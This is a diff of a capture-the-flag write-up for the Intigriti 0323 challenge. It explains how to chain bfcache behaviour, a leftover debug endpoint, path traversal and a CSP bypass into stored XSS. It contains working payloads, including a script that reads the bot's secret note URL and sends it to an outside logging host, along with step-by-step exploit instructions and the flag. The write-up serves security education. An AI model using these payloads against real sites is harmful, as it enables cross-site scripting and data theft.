@@ -42,7 +42,7 @@ app.use(
 ```
 In this case CORS will only be allowed from the origin `http://127.0.0.1`.  
 
-Just to be clear 100% clear CORS is a browser based mechanism. It's the opposite to the SOP. SOP closes access down, CORS opens it up again (if wanted by the web hoster). Outside of the context of browsers CORS and SOP do nothing.
+Just to be 100% CORS is a browser based mechanism. It's the opposite to the SOP. SOP closes access down, CORS opens it up again (if wanted by the web hoster). Outside of the context of browsers CORS and SOP do nothing.
 
 At first sight it may be confusing to allow CORS from `127.0.0.1`. Because 99.9% of web apps run on the loopback address `127.0.0.1` anyway. Every page can read it's own origin. Setting it to the localhost IP is mostly done for testing. 
 
@@ -83,8 +83,8 @@ await delay(1000);
 // Visit the user input URL
 await page.goto(url);
 ```
-It uses the default loopback address `127.0.0.1` for the ``
-page.goto(`${URL}/create`);``. It could have very well used the public facing `challenge-0323.intigriti.io` domain, as the bot obviously has access to the internet but the developer chose the local address.
+It uses the default loopback address `127.0.0.1` for the
+`page.goto(`${URL}/create`);`. It could have very well used the public facing `challenge-0323.intigriti.io` domain, as the bot obviously has access to the internet but the developer chose the local address.
 
 You may ask yourself why this is important for us. The bot creates the flag note and the note will exist for users that go to `127.0.0.1` (the bot) and for the ones that use `challenge-0323.intigriti.io` (the outside world). It's the same application just accessed differently!
 
@@ -184,7 +184,7 @@ As it's highly unlikely that the challenge author expects us to find a bypass to
 ## Let's talk about caches
 Cache entries are basically HTTP responses written to disk or memory, that way if your browser makes a request he already did in the past he can pull it up directly from your computer instead of requesting it again from the remote server, which would take much longer.
 
-All kinds requests are under certain circumstances eligible to be cached. It doesn't matter if it's a image loaded via `<img src=...>` or web page opened via the URL bar of your browser or if it's done from javascript via a `fetch()` call.
+All kinds of requests are under certain circumstances eligible to be cached. It doesn't matter if it's a image loaded via `<img src=...>` or web page opened via the URL bar of your browser or if it's done from javascript via a `fetch()` call.
 
 I will use my own tool https://httpx.43z.one to play with caching a bit more. 
 
@@ -197,8 +197,8 @@ const responseHeaders = `access-control-allow-origin=*&cache-control=max-age=5`
 
 fetch(url+responseHeaders)
 ```
-We start by constructing the URL for the `httpx` web tool. Remember what we talked about in the beginning `CORS`.  The origin from where the snippet will be running is`editor.43z.one` and that's different from `httpx.43z.one`. That's why we need the browser to allow us our `CORS` request. 
-We do that by telling the server (`httpx`) to respond with the header `access-control-allow-origin=*`. This gives any origin the ability to read the response and potentially cache it.
+We start by constructing the URL for the `httpx` web tool. Remember what we talked about in the beginning `CORS`.  The origin from where the snippet will be running is `editor.43z.one` and that's different from `httpx.43z.one`. That's why we need the browser to allow us our `CORS` request. 
+We do that by telling the server (`httpx`) to respond with the header `access-control-allow-origin:*`. This gives any origin the ability to read the response and potentially cache it.
 
 The next header controls how the browser will behave in caching this very response `cache-control=max-age=5`. It instructs the browser to cache the response for exactly 5 seconds.
 
@@ -236,7 +236,7 @@ app.get("/note/:id", (req, res) => {
 	}
 });
 ```
-But instead just gives us the content of the note and nothing more.
+But instead just gives us the content of the note and nothing more directly from the cache.
 
 The theory sounds good until you realize there is this line `res.setHeader("content-type", "text/plain"); // no xss	`
 
@@ -246,7 +246,7 @@ Even if the browser would cache the response, it's of the wrong content type. We
 It does not render any elements. Just plain text. In order for this to work we would need the content type of `text/html`
 
 ![enter image description here](https://imgur.com/yNITO0R.png)
-If there only was a endpoint in the challenge that would return the note and not set such the `text/plain` content header.
+If there only was a endpoint in the challenge that would return the note and not set the `text/plain` content header.
 
 Oh look there is one! A debug endpoint which was forgotten to be removed by the developer.
 
@@ -298,7 +298,7 @@ by using this trick it effectively goes back one directory
 
 and we make sure to hit the `/debug` endpoint.
 
-After we sent the manipulated request it's time to open the direct URL of the note that was done via `fetch()` call and is now hopefully cached `https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`
+After we sent the manipulated request it's time to open the direct URL of the note that was requested via `fetch()` call and is now hopefully cached `https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`
 
 ![enter image description here](https://imgur.com/qwle0kT.gif)
 Bummer! It's not working. The response does not get pulled from the cache. Maybe it has something to do with the `vary: Origin` header that is present in the response from the request to `https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`
@@ -316,6 +316,7 @@ We execute the `fetch` call and then we change the current document URL to the s
 
 ![enter image description here](https://imgur.com/wAiyuJx.png)
 Works perfectly. Now we add the header.
+
 ![enter image description here](https://imgur.com/O0OJFO3.png)
 And it stops serving from the cache. 
 https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary
@@ -324,7 +325,7 @@ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary
 
 The browser takes into account the origin of the request when it decides if to show the response from the cache. And in our case the Origins differ. `fetch()` adds automatically the origin of `editor.43z.one` or in the case of the challenge `challenge-0323.intigriti.io`. But if you open an URL from the URL bar (or use in javascript `location=url` or `open(url)`) there is no `origin` header set to the request.
 
-Wait! But is this really the reason it did not cache? If we look again into the response header we will see that there isn't even a `cache-control` header present.
+Wait! But is this really the reason it did not cache? If we look again into the response header on the challenge we will notice that there isn't even a `cache-control` header present.
 
 ![enter image description here](https://imgur.com/MxWllAO.png)
 Maybe this is actually the reason why it's not getting cached at all. By reading through some MDN articles I stumbled upon this. https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching#heuristic_caching
@@ -344,7 +345,8 @@ https://web.dev/bfcache/
 Let's give this bfcache a try and see how it works in action.
 
 ![enter image description here](https://imgur.com/wH46vQL.png)
-Let's go step by step. First Opening a prepared payload note URL in which we put the debug URL into the `id`. Then opening the just fetched URL directly. As expected and tested before it's not cached. Next we press the browsers back button.
+
+Step by step, what is going on here? First we opened a prepared payload note URL in which we put the debug URL into the `id`. Then we opened the just fetched URL directly. As expected and tested before it's not cached. Next we press the browsers back button.
 
 Interesting at this stage, we see almost no requests happening in the dev tools, not even from cache. I guess the page must come from the bfcache then and the chrome dev tools just don't indicate it in any way. The page just appears out of thin "bfcache" air.
 
@@ -423,7 +425,7 @@ One way to read the bots secret note is to put following code into our payload n
 	r = fetch("http://127.0.0.1/notes").then(x => x.text()).then(console.log)
 </script>
 ```
-(If you don't understand the `127.0.0.1` here, read the `What we need to find` section again)
+(If you don't understand the `127.0.0.1` here, read the `The idea of a solution` section again)
 
 But not so quick! If we do the "backward" spiel with our crafted payload we will get this.
 
@@ -494,7 +496,7 @@ We would either need the `=>` for an anonymous arrow function or `{}` for defini
 
 There is an alternative though to using javascript and `fetch`. 
 
-The CSP says `frame-src 'self'; ` we can just an `iframe` and frame the `/notes` endpoint this way we don't have to use all the code for `fetch()` just access it directly via the html element.
+The CSP says `frame-src 'self'; ` we can just an `iframe` and frame the `/notes` endpoint this way we don't have to use all the code for `fetch()` and just access it directly via the html element.
 The iframe is on the same origin as the payload note itself so it should be no problem to access the content of the iframe.
 
 ```
@@ -503,16 +505,16 @@ The iframe is on the same origin as the payload note itself so it should be no p
 ```
 `document.links` provides us with all links on the page. And the first one will be the URL of the flag note.
 
-A neat alternative to `document.links[0]` namely `document.links.item(0)`  is used that way we don't run into the issue of `encodeURI` escaping `[]`.
+A neat alternative to `document.links[0]`, `document.links.item(0)` is used, that way we don't run into the issue of `encodeURI` escaping `[]`.
 
 But if we test the payload above we will get an error.
 
 ![enter image description here](https://imgur.com/zbmh1lV.png)
 Although there clearly is a "test" flag note in the iframe. And if we run `i.contentDocument.links.item(0).href` manually we get the URL of it, the payload it self was not able to get it and says `item(0)` was undefined.
 
-This indicates that at the time the payload script run the iframe with `/note` was not yet loaded fully.
+This indicates that at the time the payload script run the iframe with `/note` has not yet finished loading.
 
-There is a syntax of `setTimeout()` that would not make use of `=>` or `{}` that could possibly help us here. `setTimeout('alert(...)', 2000)`, this would give enough time until the iframe was finished loading. But CSP does not allow it. 
+There is a syntax of `setTimeout()` that would not make use of `=>` or `{}` that could possibly help us here. `setTimeout('alert(...)', 2000)`, this would provide enough time until the iframe finished loading. But CSP does not allow it. 
 
 From https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_eval_expressions
 
@@ -529,7 +531,7 @@ From https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-
 
 In our case `'unsafe-eval'` is not specified within the CSP. 
 
-But there is another neat trick to delay the javascript execution. By placing a `style` that `import`'s garbage. But we still have to respect that CSP
+But there is another neat trick to delay the javascript execution. By placing a `style` that `import`'s some garbage. But we still have to respect that CSP
 ```
 style-src fonts.gstatic.com fonts.googleapis.com 'self' 'unsafe-inline';
 ```
@@ -539,9 +541,9 @@ If we run this test payload note
 <style>@import '//fonts.gstatic.com'</style>
 <script src="http://127.0.0.1/a/;alert(i.contentDocument.links.item(0).href)"></script>
 ```
-we will alert the flag URL. Not we just have to exfiltrate it back. We just change the documents `location` to server we have access to and append the secret note URL to the path. I'm going to use https://log.43z.one. Another tool I created that simply logs all requests that were made to it. 
+we will alert the flag URL. Now we just have to exfiltrate it back to us. We do this by changing the documents `location` to server we have access to and append the secret note URL to the path. I'm going to use https://log.43z.one. Another tool I created that simply logs all requests that are made to it on a website. 
 
-`location = 'https://log.43z.one' + flag`
+`location = 'https://log.43z.one/' + flag`
 
 
 # Final instructions
@@ -552,9 +554,9 @@ we will alert the flag URL. Not we just have to exfiltrate it back. We just chan
 <script src="http://127.0.0.1/a/;location='//log.43z.one/'+i.contentDocument.links.item(0).href)"></script>
 ```
 
-2. Construct **URL1** like this https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/**PAYLOAD_ID**
+2. Construct **URL1** like this https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/ **PAYLOAD_ID**
 
-3. Construct **URL2** like this https://challenge-0323.intigriti.io/note/**PAYLOAD_ID**?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/**PAYLOAD_ID**
+3. Construct **URL2** like this https://challenge-0323.intigriti.io/note/**PAYLOAD_ID**?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/ **PAYLOAD_ID**
 
 4. Construct a web page with the following content and name it's URL **FIRST_STAGE**
 
@@ -574,12 +576,12 @@ if(url1 && url2){
 6. Construct **VISIT_URL** like this **FIRST_STAGE**?url1=**URL1**&url2=**URL2**
 
 7. Open the URL https://log.43z.one in a Tab 1
-8. Open the URL https://challenge-0323.intigriti.io/visit?url=**VISIT_URL** in Tab 2
+8. Open the URL https://challenge-0323.intigriti.io/visit?url= **VISIT_URL** in Tab 2
 9. Watch Tab 1 until the URL of note with the flag appears
 10. Open URL of flag note 
 11. Enjoy the flag `INTIGRITI{b4ckw4rD_f0rw4rd_c4ch3_x55_3h?}`
 
-Here is how it looks exploiting the challenge locally with the setting `headless` to `false`.
+Here is how it looks exploiting the challenge locally with the setting `headless` to `false` in `bot.js`.
 
 ![enter image description here](https://imgur.com/Imt05NF.png)
 
